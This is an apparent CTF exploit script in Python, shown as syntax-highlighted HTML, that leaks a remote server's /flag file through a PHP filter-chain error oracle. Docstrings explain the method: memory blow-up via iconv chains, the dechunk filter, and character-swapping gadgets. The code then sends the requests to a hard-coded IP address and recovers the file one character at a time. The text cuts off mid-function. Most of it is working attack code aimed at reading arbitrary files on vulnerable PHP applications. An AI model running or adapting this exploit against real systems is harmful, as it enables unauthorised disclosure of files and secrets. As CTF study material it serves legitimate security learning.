python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">THE GRAND IDEA:</span></span><br><span class="line"><span class="string">We can use PHP memory limit as an error oracle. Repeatedly applying the convert.iconv.L1.UCS-4LE</span></span><br><span class="line"><span class="string">filter will blow up the string length by 4x every time it is used, which will quickly cause</span></span><br><span class="line"><span class="string">500 error if and only if the string is non empty. So we now have an oracle that tells us if</span></span><br><span class="line"><span class="string">the string is empty.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">THE GRAND IDEA 2:</span></span><br><span class="line"><span class="string">The dechunk filter is interesting.</span></span><br><span class="line"><span class="string">https://github.com/php/php-src/blob/01b3fc03c30c6cb85038250bb5640be3a09c6a32/ext/standard/filters.c#L1724</span></span><br><span class="line"><span class="string">It looks like it was implemented for something http related, but for our purposes, the interesting</span></span><br><span class="line"><span class="string">behavior is that if the string contains no newlines, it will wipe the entire string if and only if</span></span><br><span class="line"><span class="string">the string starts with A-Fa-f0-9, otherwise it will leave it untouched. This works perfect with our</span></span><br><span class="line"><span class="string">above oracle! In fact we can verify that since the flag starts with D that the filter chain</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">dechunk|convert.iconv.L1.UCS-4LE|convert.iconv.L1.UCS-4LE|[...]|convert.iconv.L1.UCS-4LE</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">does not cause a 500 error.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">THE REST:</span></span><br><span class="line"><span class="string">So now we can verify if the first character is in A-Fa-f0-9. The rest of the challenge is a descent</span></span><br><span class="line"><span class="string">into madness trying to figure out ways to:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">- somehow get other characters not at the start of the flag file to the front</span></span><br><span class="line"><span class="string">- detect more precisely which character is at the front</span></span><br><span class="line"><span class="string">  &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">join</span>(<span class="params">*x</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;|&#x27;</span>.join(x)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">err</span>(<span class="params">s</span>):</span><br><span class="line">    <span class="built_in">print</span>(s)</span><br><span class="line">    <span class="keyword">raise</span> ValueError</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">req</span>(<span class="params">s</span>):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> requests.get(<span class="string">&#x27;http://39.105.5.7:49227/?my[secret.flag=C:8:%22Saferman%22:0:&#123;&#125;&amp;secret=&#x27;</span>+<span class="string">f&#x27;php://filter/<span class="subst">&#123;s&#125;</span>/resource=/flag&#x27;</span>).status_code == <span class="number">500</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">blow_up_enc = join(*[<span class="string">&#x27;convert.quoted-printable-encode&#x27;</span>]*<span class="number">1000</span>)</span><br><span class="line">blow_up_utf32 = <span class="string">&#x27;convert.iconv.L1.UCS-4LE&#x27;</span></span><br><span class="line">blow_up_inf = join(*[blow_up_utf32]*<span class="number">50</span>)</span><br><span class="line"></span><br><span class="line">header = <span class="string">&#x27;convert.base64-encode|convert.base64-encode&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Start get baseline blowup</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Calculating blowup&#x27;</span>)</span><br><span class="line">baseline_blowup = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    payload = join(*[blow_up_utf32]*n)</span><br><span class="line">    <span class="keyword">if</span> req(<span class="string">f&#x27;<span class="subst">&#123;header&#125;</span>|<span class="subst">&#123;payload&#125;</span>&#x27;</span>):</span><br><span class="line">        baseline_blowup = n</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    err(<span class="string">&#x27;something wrong&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;baseline blowup is <span class="subst">&#123;baseline_blowup&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line">trailer = join(*[blow_up_utf32]*(baseline_blowup-<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> req(<span class="string">f&#x27;<span class="subst">&#123;header&#125;</span>|<span class="subst">&#123;trailer&#125;</span>&#x27;</span>) == <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;detecting equals&#x27;</span>)</span><br><span class="line">j = [</span><br><span class="line">    req(<span class="string">f&#x27;convert.base64-encode|convert.base64-encode|<span class="subst">&#123;blow_up_enc&#125;</span>|<span class="subst">&#123;trailer&#125;</span>&#x27;</span>),</span><br><span class="line">    req(<span class="string">f&#x27;convert.base64-encode|convert.iconv..CSISO2022KR|convert.base64-encode<span class="subst">&#123;blow_up_enc&#125;</span>|<span class="subst">&#123;trailer&#125;</span>&#x27;</span>),</span><br><span class="line">    req(<span class="string">f&#x27;convert.base64-encode|convert.iconv..CSISO2022KR|convert.iconv..CSISO2022KR|convert.base64-encode|<span class="subst">&#123;blow_up_enc&#125;</span>|<span class="subst">&#123;trailer&#125;</span>&#x27;</span>)</span><br><span class="line">]</span><br><span class="line"><span class="built_in">print</span>(j)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">sum</span>(j) != <span class="number">2</span>:</span><br><span class="line">    err(<span class="string">&#x27;something wrong&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> j[<span class="number">0</span>] == <span class="literal">False</span>:</span><br><span class="line">    header = <span class="string">f&#x27;convert.base64-encode|convert.iconv..CSISO2022KR|convert.base64-encode&#x27;</span></span><br><span class="line"><span class="keyword">elif</span> j[<span class="number">1</span>] == <span class="literal">False</span>:</span><br><span class="line">    header = <span class="string">f&#x27;convert.base64-encode|convert.iconv..CSISO2022KR|convert.iconv..CSISO2022KRconvert.base64-encode&#x27;</span></span><br><span class="line"><span class="keyword">elif</span> j[<span class="number">2</span>] == <span class="literal">False</span>:</span><br><span class="line">    header = <span class="string">f&#x27;convert.base64-encode|convert.base64-encode&#x27;</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    err(<span class="string">&#x27;something wrong&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;j: <span class="subst">&#123;j&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;header: <span class="subst">&#123;header&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Step two:</span></span><br><span class="line"><span class="string">Now we have something of the form</span></span><br><span class="line"><span class="string">[a-zA-Z0-9 things]==</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Here the pain begins. For a long time I was trying to find something that would allow me to strip</span></span><br><span class="line"><span class="string">successive characters from the start of the string to access every character. Maybe something like</span></span><br><span class="line"><span class="string">that exists but I couldn&#x27;t find it. However, if you play around with filter combinations you notice</span></span><br><span class="line"><span class="string">there are filters that *swap* characters:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">convert.iconv.CSUNICODE.UCS-2BE, which I call r2, flips every pair of characters in a string:</span></span><br><span class="line"><span class="string">abcdefgh -&gt; badcfehg</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">convert.iconv.UCS-4LE.10646-1:1993, which I call r4, reverses every chunk of four characters:</span></span><br><span class="line"><span class="string">abcdefgh -&gt; dcbahgfe</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">This allows us to access the first four characters of the string. Can we do better? It turns out</span></span><br><span class="line"><span class="string">YES, we can! Turns out that convert.iconv.CSUNICODE.CSUNICODE appends &lt;0xff&gt;&lt;0xfe&gt; to the start of</span></span><br><span class="line"><span class="string">the string:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">abcdefgh -&gt; &lt;0xff&gt;&lt;0xfe&gt;abcdefgh</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">The idea being that if we now use the r4 gadget, we get something like:</span></span><br><span class="line"><span class="string">ba&lt;0xfe&gt;&lt;0xff&gt;fedc</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">And then if we apply a convert.base64-decode|convert.base64-encode, it removes the invalid</span></span><br><span class="line"><span class="string">&lt;0xfe&gt;&lt;0xff&gt; to get:</span></span><br><span class="line"><span class="string">bafedc</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">And then apply the r4 again, we have swapped the f and e to the front, which were the 5th and 6th</span></span><br><span class="line"><span class="string">characters of the string. There&#x27;s only one problem: our r4 gadget requires that the string length</span></span><br><span class="line"><span class="string">is a multiple of 4. The original base64 string will be a multiple of four by definition, so when</span></span><br><span class="line"><span class="string">we apply convert.iconv.CSUNICODE.CSUNICODE it will be two more than a multiple of four, which is no</span></span><br><span class="line"><span class="string">good for our r4 gadget. This is where the double equals we required in step 1 comes in! Because it</span></span><br><span class="line"><span class="string">turns out, if we apply the filter</span></span><br><span class="line"><span class="string">convert.quoted-printable-encode|convert.quoted-printable-encode|convert.iconv.L1.utf7|convert.iconv.L1.utf7|convert.iconv.L1.utf7|convert.iconv.L1.utf7</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">It will turn the == into:</span></span><br><span class="line"><span class="string">+---AD0-3D3D+---AD0-3D3D</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">And this is magic, because this corrects such that when we apply the</span></span><br><span class="line"><span class="string">convert.iconv.CSUNICODE.CSUNICODE filter the resuting string is exactly a multiple of four!</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Let&#x27;s recap. We have a string like:</span></span><br><span class="line"><span class="string">abcdefghij==</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Apply the convert.quoted-printable-encode + convert.iconv.L1.utf7:</span></span><br><span class="line"><span class="string">abcdefghij+---AD0-3D3D+---AD0-3D3D</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Apply convert.iconv.CSUNICODE.CSUNICODE:</span></span><br><span class="line"><span class="string">&lt;0xff&gt;&lt;0xfe&gt;abcdefghij+---AD0-3D3D+---AD0-3D3D</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Apply r4 gadget:</span></span><br><span class="line"><span class="string">ba&lt;0xfe&gt;&lt;0xff&gt;fedcjihg---+-0DAD3D3---+-0DAD3D3</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Apply base64-decode | base64-encode, so the &#x27;-&#x27; and high bytes will disappear:</span></span><br><span class="line"><span class="string">bafedcjihg+0DAD3D3+0DAD3Dw==</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Then apply r4 once more:</span></span><br><span class="line"><span class="string">efabijcd0+gh3DAD0+3D3DAD==wD</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">And here&#x27;s the cute part: not only have we now accessed the 5th and 6th chars of the string, but</span></span><br><span class="line"><span class="string">the string still has two equals signs in it, so we can reapply the technique as many times as we</span></span><br><span class="line"><span class="string">want, to access all the characters in the string ;)</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">flip = <span class="string">&quot;convert.quoted-printable-encode|convert.quoted-printable-encode|convert.iconv.L1.utf7|convert.iconv.L1.utf7|convert.iconv.L1.utf7|convert.iconv.L1.utf7|convert.iconv.CSUNICODE.CSUNICODE|convert.iconv.UCS-4LE.10646-1:1993|convert.base64-decode|convert.base64-encode&quot;</span></span><br><span class="line">r2 = <span class="string">&quot;convert.iconv.CSUNICODE.UCS-2BE&quot;</span></span><br><span class="line">r4 = <span class="string">&quot;convert.iconv.UCS-4LE.10646-1:1993&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_nth</span>(<span class="params">n</span>):</span><br><span class="line">    <span class="keyword">global</span> flip, r2, r4</span><br><span class="line">    o = []</span><br><span class="line">    chunk = n // <span class="number">2</span></span><br><span class="line">    <span class="keyword">if</span> chunk % <span class="number">2</span> == <span class="number">1</span>: o.append(r4)</span><br><span class="line">    o.extend([flip, r4] * (chunk // <span class="number">2</span>))</span><br><span class="line">    <span class="keyword">if</span> (n % <span class="number">2</span> == <span class="number">1</span>) ^ (chunk % <span class="number">2</span> == <span class="number">1</span>): o.append(r2)</span><br><span class="line">    <span class="keyword">return</span> join(*o)</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Step 3:</span></span><br><span class="line"><span class="string">This is the longest but actually easiest part. We can use dechunk oracle to figure out if the first</span></span><br><span class="line"><span class="string">char is 0-9A-Fa-f. So it&#x27;s just a matter of finding filters which translate to or from those</span></span><br><span class="line"><span class="string">chars. rot13 and string lower are helpful. There are probably a million ways to do this bit but</span></span><br><span class="line"><span class="string">I just bruteforced every combination of iconv filters to find these.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Numbers are a bit trickier because iconv doesn&#x27;t tend to touch them.</span></span><br><span class="line"><span class="string">In the CTF you coud porbably just guess from there once you have the letters. But if you actually </span></span><br><span class="line"><span class="string">want a full leak you can base64 encode a third time and use the first two letters of the resulting</span></span><br><span class="line"><span class="string">string to figure out which number it is.</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">rot1 = <span class="string">&#x27;convert.iconv.437.CP930&#x27;</span></span><br><span class="line">be = <span class="string">&#x27;convert.quoted-printable-encode|convert.iconv..UTF7|convert.base64-decode|convert.base64-encode&#x27;</span></span><br><span class="line">o = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_letter</span>(<span class="params">prefix</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">        <span class="comment"># a-f A-F 0-9</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|<span class="subst">&#123;rot1&#125;</span>|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">            <span class="comment"># a-e</span></span><br><span class="line">            <span class="keyword">for</span> n <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">                <span class="keyword">if</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|&#x27;</span> + <span class="string">f&#x27;<span class="subst">&#123;rot1&#125;</span>|<span class="subst">&#123;be&#125;</span>|&#x27;</span>*(n+<span class="number">1</span>) + <span class="string">f&#x27;<span class="subst">&#123;rot1&#125;</span>|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">                    <span class="keyword">return</span> <span class="string">&#x27;edcba&#x27;</span>[n]</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                err(<span class="string">&#x27;something wrong&#x27;</span>)</span><br><span class="line">        <span class="keyword">elif</span> <span class="keyword">not</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|string.tolower|<span class="subst">&#123;rot1&#125;</span>|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">            <span class="comment"># A-E</span></span><br><span class="line">            <span class="keyword">for</span> n <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">                <span class="keyword">if</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|string.tolower|&#x27;</span> + <span class="string">f&#x27;<span class="subst">&#123;rot1&#125;</span>|<span class="subst">&#123;be&#125;</span>|&#x27;</span>*(n+<span class="number">1</span>) + <span class="string">f&#x27;<span class="subst">&#123;rot1&#125;</span>|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">                    <span class="keyword">return</span> <span class="string">&#x27;EDCBA&#x27;</span>[n]</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                err(<span class="string">&#x27;something wrong&#x27;</span>)</span><br><span class="line">        <span class="keyword">elif</span> <span class="keyword">not</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|convert.iconv.CSISO5427CYRILLIC.855|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;*&#x27;</span></span><br><span class="line">        <span class="keyword">elif</span> <span class="keyword">not</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|convert.iconv.CP1390.CSIBM932|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">            <span class="comment"># f</span></span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;f&#x27;</span></span><br><span class="line">        <span class="keyword">elif</span> <span class="keyword">not</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|string.tolower|convert.iconv.CP1390.CSIBM932|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">            <span class="comment"># F</span></span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;F&#x27;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            err(<span class="string">&#x27;something wrong&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> <span class="keyword">not</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|string.rot13|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">        <span class="comment"># n-s N-S</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|string.rot13|<span class="subst">&#123;rot1&#125;</span>|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">            <span class="comment"># n-r</span></span><br><span class="line">            <span class="keyword">for</span> n <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">                <span class="keyword">if</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|string.rot13|&#x27;</span> + <span class="string">f&#x27;<span class="subst">&#123;rot1&#125;</span>|<span class="subst">&#123;be&#125;</span>|&#x27;</span>*(n+<span class="number">1</span>) + <span class="string">f&#x27;<span class="subst">&#123;rot1&#125;</span>|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">                    <span class="keyword">return</span> <span class="string">&#x27;rqpon&#x27;</span>[n]</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                err(<span class="string">&#x27;something wrong&#x27;</span>)</span><br><span class="line">        <span class="keyword">elif</span> <span class="keyword">not</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|string.rot13|string.tolower|<span class="subst">&#123;rot1&#125;</span>|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">            <span class="comment"># N-R</span></span><br><span class="line">            <span class="keyword">for</span> n <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">                <span class="keyword">if</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|string.rot13|string.tolower|&#x27;</span> + <span class="string">f&#x27;<span class="subst">&#123;rot1&#125;</span>|<span class="subst">&#123;be&#125;</span>|&#x27;</span>*(n+<span class="number">1</span>) + <span class="string">f&#x27;<span class="subst">&#123;rot1&#125;</span>|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">                    <span class="keyword">return</span> <span class="string">&#x27;RQPON&#x27;</span>[n]</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                err(<span class="string">&#x27;something wrong&#x27;</span>)</span><br><span class="line">        <span class="keyword">elif</span> <span class="keyword">not</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|string.rot13|convert.iconv.CP1390.CSIBM932|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">            <span class="comment"># s</span></span><br><span class="line">            <span class="keyword">return</span> <span 